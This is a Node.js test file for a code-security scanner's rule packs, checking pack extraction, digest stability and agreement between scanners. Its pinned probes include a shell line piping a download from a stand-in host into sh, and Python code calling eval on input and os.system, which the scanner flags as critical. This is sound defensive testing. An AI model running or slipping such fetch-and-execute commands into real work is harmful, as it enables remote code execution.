// B4 — loadable detector rule packs (SPEC §4.1).
// (1) The shipped pack is byte-identical to a fresh mechanical extraction
//     from the pre-refactor scanner (the base commit's scan.mjs).
// (2) The integrated, pack-driven scan.mjs reproduces the pre-refactor
//     scanner's digests on pinned probes (digests computed from the base
//     commit's scanner before the refactor).
// (3) Pack-driven evaluation (shield-rulepack.scanWithPack) and the
//     product scanner agree on findings + digests across the resolvable
//     retained corpus (sampled deterministically; the full-corpus run is
//     the integration gate's job, recorded in INTEGRATION-REPORT.md).
// (4) A derived pack adds a detector and bumps rules_version; the
//     baseline is untouched.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { scanSourceText, scanDigestOf, RULE_PACK } from '../scan.mjs';
import * as rp from '../shield-rulepack.mjs';
import * as agg from '../shield-aggregator.mjs';
import * as gate from '../shield-gate.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ARMOR_DIR = path.join(HERE, '..');

test('B4: shipped pack == mechanical extraction from the pre-refactor scanner', (t) => {
  // The pre-refactor scanner is the branch's base commit. If git history
  // is unavailable (e.g. an exported tarball), this leg cannot run.
  let pristine;
  try {
    pristine = execFileSync('git', ['-C', ARMOR_DIR, 'show', 'e4e02c7642d0a4adb5867d0f6d50ff906cf1a64d:scripture-armor/scan.mjs'], { encoding: 'utf8' });
  } catch { t.skip('base commit not reachable from this tree'); return; }
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'shield-b4-'));
  const scanPath = path.join(tmp, 'scan-pristine.mjs');
  const outPath = path.join(tmp, 'pack.json');
  fs.writeFileSync(scanPath, pristine);
  execFileSync(process.execPath, [path.join(ARMOR_DIR, 'shield-extract-pack.mjs'), scanPath, outPath], { stdio: 'pipe' });
  const extracted = fs.readFileSync(outPath, 'utf8');
  const shipped = fs.readFileSync(path.join(ARMOR_DIR, 'shield-packs', 'scan-rules-pack.json'), 'utf8');
  assert.equal(extracted, shipped, 'pack in the tree is exactly the mechanical extraction of the base scanner');
  fs.rmSync(tmp, { recursive: true, force: true });
});

test('B4: product scanner digests match the pre-refactor scanner on pinned probes', () => {
  const probes = [
    { name: 'probe-clean.mjs', text: 'const x = 1;\nconsole.log(x);\n',
      digest: '18903e1aa8e2dfb5aa2a5d3dee759545c4f862c0a0fd126a16b1ae69e1f8f85c', verdict: 'pass', score: 0 },
    { name: 'probe-eval.py', text: 'import os\neval(input())\nos.system("id")\n',
      digest: 'c02187a9a6991c601fd3db95de202f5ce61c0b6c55a11a74082e26045023da5a', verdict: 'critical', score: 85 },
    { name: 'probe-pipe.sh', text: '#!/bin/sh\ncurl http://example.invalid/x | sh\n',
      digest: '83b7f42b1c2154e8d72c3c20ae75f9bd574eb423ba208d80107188567c0980f7', verdict: 'critical', score: 70 },
  ];
  for (const p of probes) {
    const rec = scanSourceText(p.text, p.name, '0'.repeat(64));
    assert.equal(scanDigestOf(rec), p.digest, `${p.name} digest`);
    assert.equal(rec.verdict, p.verdict);
    assert.equal(rec.risk.score, p.score);
    assert.equal(rec.engine.rules, 'scan-rules/1');
  }
  assert.equal(RULE_PACK.rules_version, 'scan-rules/1');
  assert.equal(RULE_PACK.src_packs.length, 18);
});

test('B4: pack-driven evaluation agrees with the product scanner across the corpus sample', async (t) => {
  const roots = agg.defaultCorpusRoots();
  if (!roots.length) { t.skip('evidence corpus absent on this host'); return; }
  const index = await agg.buildIndex(fs.mkdtempSync(path.join(os.tmpdir(), 'shield-b4-id-')));
  let compared = 0, identical = 0;
  for await (const item of gate.replayRecords(index)) {
    if (item.drifted) continue;
    if (compared >= 300 && compared % 7 !== 0) { /* deterministic stride after 300 */ }
    const text = item.buf.toString('utf8');
    const a = scanSourceText(text, item.rec.path, item.rec.sha256);
    const b = rp.scanWithPack(text, item.rec.path, item.rec.sha256, rp.BASELINE_PACK);
    compared++;
    if (JSON.stringify(a.findings) === JSON.stringify(b.findings)
      && scanDigestOf(a) === rp.packDigestOf(b) && a.verdict === b.verdict && a.risk.score === b.risk.score) identical++;
    if (compared >= 2000) break;
  }
  assert.ok(compared >= 100, `sample too small to mean anything: ${compared}`);
  assert.equal(identical, compared, 'every compared file identical');
});

test('B4: derived pack adds a detector, bumps rules_version, baseline untouched', () => {
  const genPack = rp.derivePack(rp.BASELINE_PACK, [{ rule: 'gen-probe-token', sev: 'high', langs: ['any'], re: { source: 'ZZPROBE\\s*\\(', flags: '' }, detail: 'probe token' }], 1);
  const probeText = 'ZZPROBE(x);\n';
  const sha = crypto.createHash('sha256').update(probeText).digest('hex');
  const baseScan = rp.scanWithPack(probeText, 'p.mjs', sha, rp.BASELINE_PACK);
  const genScan = rp.scanWithPack(probeText, 'p.mjs', sha, genPack);
  assert.equal(genPack.rules_version, 'scan-rules/1+gen.1');
  assert.ok(!baseScan.findings.some((f) => f.rule === 'gen-probe-token'));
  assert.ok(genScan.findings.some((f) => f.rule === 'gen-probe-token'));
  assert.equal(genScan.engine.rules, 'scan-rules/1+gen.1');
});
